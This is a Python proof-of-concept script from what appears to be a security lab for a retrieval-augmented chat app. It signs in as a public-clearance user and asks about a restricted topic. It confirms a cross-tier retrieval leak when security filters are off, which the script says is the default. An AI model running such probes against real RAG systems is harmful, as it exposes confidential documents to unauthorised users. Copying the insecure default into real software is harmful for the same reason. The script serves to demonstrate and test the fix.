#!/usr/bin/env python3
"""Phase 2 attack: cross-tier retrieval leak.

A public-clearance reader retrieves a restricted document. In the insecure
configuration (SECURITY_FILTERS_ENABLED=false, the default), retrieval ignores
the caller's clearance and searches every tier — see rag_chain.py, where
`tiers` is set to the full TIERS tuple instead of allowed_tiers(user.clearance).

The proof is the `sources` list on the /query response: a `restricted/...`
entry means a public account just read restricted content. This does not depend
on the model's answer text — sources are returned straight from retrieval — so
the check is deterministic even though generation is not.

Run against a live app (uvicorn app.main:app). Same script, both phases:
    phase 2  SECURITY_FILTERS_ENABLED=false -> LEAK  (exit 0)
    phase 3  SECURITY_FILTERS_ENABLED=true  -> BLOCKED (exit 1)
Exit 0 means the exploit landed.

Config via env: SECURERAG_URL, ATTACK_USER, ATTACK_PASS.
"""

from __future__ import annotations

import json
import os
import sys
import urllib.error
import urllib.request

BASE = os.environ.get("SECURERAG_URL", "http://localhost:8000").rstrip("/")
USER = os.environ.get("ATTACK_USER", "carol")   # public clearance, reader
PASS = os.environ.get("ATTACK_PASS", "pw-carol")

# A content-matched question, not a filename. The attacker does not know the
# restricted document exists; they ask about the topic and retrieval hands it
# over anyway.
QUESTION = "What are our acquisition plans? Tell me about Project Redwood."


def _post(path: str, payload: dict, token: str | None = None) -> dict:
    headers = {"content-type": "application/json"}
    if token:
        headers["authorization"] = "Bearer " + token
    req = urllib.request.Request(
        BASE + path, data=json.dumps(payload).encode(), headers=headers, method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=200) as resp:
            return json.load(resp)
    except urllib.error.HTTPError as exc:
        sys.exit(f"HTTP {exc.code} on {path}: {exc.read().decode()[:200]}")
    except urllib.error.URLError as exc:
        sys.exit(f"Cannot reach {BASE} — is the app running? ({exc.reason})")


def main() -> int:
    login = _post("/login", {"username": USER, "password": PASS})
    token, clearance = login["token"], login["clearance"]
    print(f"[*] signed in as {USER} (clearance={clearance}, role={login['role']})")

    result = _post("/query", {"question": QUESTION}, token)
    sources = result.get("sources", [])
    leaked = [s for s in sources if s.startswith("restricted/")]

    print(f"[*] sources returned: {sources}")
    print(f"[*] answer: {result.get('answer', '')[:200]}")

    if leaked:
        print(f"\n[!] LEAK CONFIRMED — {clearance}-clearance account retrieved "
              f"restricted source(s): {leaked}")
        return 0
    print(f"\n[ ] BLOCKED — no restricted sources reached a {clearance} account "
          f"(refused={result.get('refused')}).")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
